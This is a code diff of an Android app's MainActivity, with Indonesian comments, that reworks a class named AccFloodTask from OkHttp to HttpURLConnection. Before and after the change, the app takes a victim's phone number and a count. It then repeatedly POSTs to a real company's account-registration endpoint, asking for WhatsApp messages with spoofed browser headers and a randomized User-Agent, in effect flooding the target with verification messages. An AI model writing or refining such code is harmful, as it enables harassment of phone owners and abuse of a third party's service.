@@ -10,19 +10,14 @@ import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
 
-// --- HARUS ADA UNTUK MENGHILANGKAN ERROR OKHTTP ---
-import okhttp3.MediaType;
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
-import okhttp3.RequestBody;
-import okhttp3.Response;
-// --------------------------------------------------
-
 import org.json.JSONArray;
 import org.json.JSONObject;
 
-import java.io.IOException;
-import java.util.concurrent.TimeUnit;
+import java.io.OutputStream;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.util.Random;
 
 public class MainActivity extends Activity {
@@ -32,8 +27,6 @@ public class MainActivity extends Activity {
     private ProgressBar progressBar;
     private TextView tvStatus;
 
-    // --- PERBAIKAN AKHIR: PROGRESS HANYA Object TUNGGAL ---
-    // Parameter Kedua (Progress) diubah menjadi Object
     private class AccFloodTask extends AsyncTask<String, Object, String> { 
 
         private int totalSuccesses = 0;
@@ -44,7 +37,6 @@ public class MainActivity extends Activity {
 
         @Override
         protected void onPreExecute() {
-            // Logika UI PreExecute dipindahkan ke OnClickListener
         }
 
         @Override
@@ -52,13 +44,7 @@ public class MainActivity extends Activity {
             String targetPhone = params[0];
             totalKirim = Integer.parseInt(params[1]);
 
-            // Setup OkHttpClient
-            OkHttpClient client = new OkHttpClient.Builder()
-                .connectTimeout(15, TimeUnit.SECONDS)
-                .readTimeout(20, TimeUnit.SECONDS) // Max 20s per request
-                .build();
-
-            String url = "https://www.acc.co.id/register/new-account";
+            String urlStr = "https://www.acc.co.id/register/new-account";
             String phoneWith0 = "0" + targetPhone;
 
             for (int i = 1; i <= totalKirim; i++) {
@@ -67,8 +53,8 @@ public class MainActivity extends Activity {
                 long startTime = System.currentTimeMillis();
                 String statusMsg;
 
+                HttpURLConnection conn = null;
                 try {
-                    // Buat Payload JSON
                     JSONArray jsonArray = new JSONArray();
                     JSONObject payload = new JSONObject();
                     payload.put("user_id", JSONObject.NULL);
@@ -77,59 +63,57 @@ public class MainActivity extends Activity {
                     payload.put("provider", "whatsapp");
                     jsonArray.put(payload);
 
-                    RequestBody body = RequestBody.create(
-                        MediaType.parse("text/plain"), 
-                        jsonArray.toString()
-                    );
+                    String jsonData = jsonArray.toString();
 
-                    // Buat Request
                     Random rand = new Random();
                     String userAgent = "Mozilla/5.0 (Android) Chrome/" + (rand.nextInt(25) + 100) + ".0.0.0 Safari/537.36";
 
-                    Request request = new Request.Builder()
-                        .url(url)
-                        .post(body)
-                        .addHeader("User-Agent", userAgent)
-                        .addHeader("Accept", "text/x-component")
-                        .addHeader("Content-Type", "text/plain")
-                        .addHeader("next-action", "7f6a1c8f7e114d52467f0195e8e23c7c6f235468b7")
-                        .addHeader("Origin", "https://www.acc.co.id")
-                        .addHeader("Referer", "https://www.acc.co.id/register/new-account")
-                        .addHeader("sec-ch-ua-platform", "\"Android\"")
-                        .build();
+                    URL url = new URL(urlStr);
+                    conn = (HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod("POST");
+                    conn.setConnectTimeout(15000);
+                    conn.setReadTimeout(20000);
+                    conn.setDoOutput(true);
 
-                    // Eksekusi
-                    try (Response response = client.newCall(request).execute()) {
-                        long duration = System.currentTimeMillis() - startTime;
-                        totalDurationMs += duration;
+                    conn.setRequestProperty("User-Agent", userAgent);
+                    conn.setRequestProperty("Accept", "text/x-component");
+                    conn.setRequestProperty("Content-Type", "text/plain");
+                    conn.setRequestProperty("next-action", "7f6a1c8f7e114d52467f0195e8e23c7c6f235468b7");
+                    conn.setRequestProperty("Origin", "https://www.acc.co.id");
+                    conn.setRequestProperty("Referer", "https://www.acc.co.id/register/new-account");
+                    conn.setRequestProperty("sec-ch-ua-platform", "\"Android\"");
 
-                        if (response.code() == 200) {
-                            totalSuccesses++;
-                            statusMsg = "SUCCESS (200 OK) - " + duration + "ms";
-                        } else {
-                            totalFailures++;
-                            statusMsg = "GAGAL (HTTP " + response.code() + ") - " + duration + "ms";
-                        }
+                    OutputStream os = conn.getOutputStream();
+                    os.write(jsonData.getBytes("UTF-8"));
+                    os.flush();
+                    os.close();
+
+                    int responseCode = conn.getResponseCode();
+                    long duration = System.currentTimeMillis() - startTime;
+                    totalDurationMs += duration;
+
+                    if (responseCode == 200) {
+                        totalSuccesses++;
+                        statusMsg = "SUCCESS (200 OK) - " + duration + "ms";
+                    } else {
+                        totalFailures++;
+                        statusMsg = "GAGAL (HTTP " + responseCode + ") - " + duration + "ms";
                     }
 
-                } catch (IOException e) {
-                    // Penanganan IOException untuk Timeout atau Koneksi
+                } catch (Exception e) {
                     long duration = System.currentTimeMillis() - startTime;
                     totalDurationMs += duration;
                     totalFailures++;
-                    statusMsg = "GAGAL (Koneksi/Timeout) - " + duration + "ms";
-                } catch (Exception e) {
-                    totalFailures++;
-                    statusMsg = "GAGAL (Error Internal: " + e.getMessage() + ")";
+                    statusMsg = "GAGAL (" + e.getMessage() + ") - " + duration + "ms";
+                } finally {
+                    if (conn != null) {
+                        conn.disconnect();
+                    }
                 }
 
-                // Update UI Progress
                 int progress = (int) ((float) i / totalKirim * 100);
-
-                // Kirim array Object ke publishProgress
                 publishProgress(progress, i, totalSuccesses, totalFailures, statusMsg);
 
-                // JEDA WAKTU
                 if (i < totalKirim) {
                     try {
                         Thread.sleep(DELAY_SECONDS * 1000);
@@ -142,11 +126,8 @@ public class MainActivity extends Activity {
             return "Selesai";
         }
 
-        // --- UBAH SIGNATURE METHOD UNTUK MENGHILANGKAN ERROR ASYNCTASK ---
-        // Karena Progress adalah Object, onProgressUpdate menerima Object... values
         @Override
         protected void onProgressUpdate(Object... values) { 
-            // Lakukan casting untuk mengambil nilai yang dikirim
             progressBar.setProgress((Integer) values[0]);
 
             int current = (Integer) values[1];
@@ -166,9 +147,8 @@ public class MainActivity extends Activity {
 
             float avgTime = (totalKirim > 0) ? (float) totalDurationMs / totalKirim : 0;
 
-            // Tampilkan Ringkasan Akhir
             String summary = String.format(
-                "✅ Selesai!\nTotal: %d\nSukses: %d\nGagal: %d\nRata-rata Waktu: %.2f ms",
+                "Selesai!\nTotal: %d\nSukses: %d\nGagal: %d\nRata-rata: %.0f ms",
                 totalKirim, totalSuccesses, totalFailures, avgTime
             );
             tvStatus.setText("Status: " + summary);
@@ -188,38 +168,37 @@ public class MainActivity extends Activity {
         tvStatus = findViewById(R.id.tv_status);
 
         btnStartFlood.setOnClickListener(new View.OnClickListener() {
-                @Override
-                public void onClick(View v) {
-                    try {
-                        String targetPhone = etTargetPhone.getText().toString().trim();
-                        String jumlahStr = etJumlahKirim.getText().toString().trim();
+            @Override
+            public void onClick(View v) {
+                try {
+                    String targetPhone = etTargetPhone.getText().toString().trim();
+                    String jumlahStr = etJumlahKirim.getText().toString().trim();
 
-                        if (targetPhone.isEmpty() || jumlahStr.isEmpty()) {
-                            Toast.makeText(MainActivity.this, "Isi semua kolom!", Toast.LENGTH_SHORT).show();
-                            return;
-                        }
-
-                        int jumlahKirim = Integer.parseInt(jumlahStr);
-                        if (jumlahKirim < 1 || jumlahKirim > 100) {
-                            Toast.makeText(MainActivity.this, "Jumlah harus antara 1-100!", Toast.LENGTH_SHORT).show();
-                            return;
-                        }
-
-                        btnStartFlood.setEnabled(false);
-                        progressBar.setVisibility(View.VISIBLE);
-                        tvStatus.setText("Status: Memulai proses...");
-
-                        new AccFloodTask().execute(targetPhone, String.valueOf(jumlahKirim));
-
-                    } catch (NumberFormatException e) {
-                        Toast.makeText(MainActivity.this, "Jumlah harus angka!", Toast.LENGTH_SHORT).show();
-                    } catch (Exception e) {
-                        Toast.makeText(MainActivity.this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
-                        btnStartFlood.setEnabled(true);
-                        progressBar.setVisibility(View.GONE);
+                    if (targetPhone.isEmpty() || jumlahStr.isEmpty()) {
+                        Toast.makeText(MainActivity.this, "Isi semua kolom!", Toast.LENGTH_SHORT).show();
+                        return;
                     }
+
+                    int jumlahKirim = Integer.parseInt(jumlahStr);
+                    if (jumlahKirim < 1 || jumlahKirim > 100) {
+                        Toast.makeText(MainActivity.this, "Jumlah harus antara 1-100!", Toast.LENGTH_SHORT).show();
+                        return;
+                    }
+
+                    btnStartFlood.setEnabled(false);
+                    progressBar.setVisibility(View.VISIBLE);
+                    tvStatus.setText("Status: Memulai proses...");
+
+                    new AccFloodTask().execute(targetPhone, String.valueOf(jumlahKirim));
+
+                } catch (NumberFormatException e) {
+                    Toast.makeText(MainActivity.this, "Jumlah harus angka!", Toast.LENGTH_SHORT).show();
+                } catch (Exception e) {
+                    Toast.makeText(MainActivity.this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
+                    btnStartFlood.setEnabled(true);
+                    progressBar.setVisibility(View.GONE);
                 }
-            });
+            }
+        });
     }
 }
-
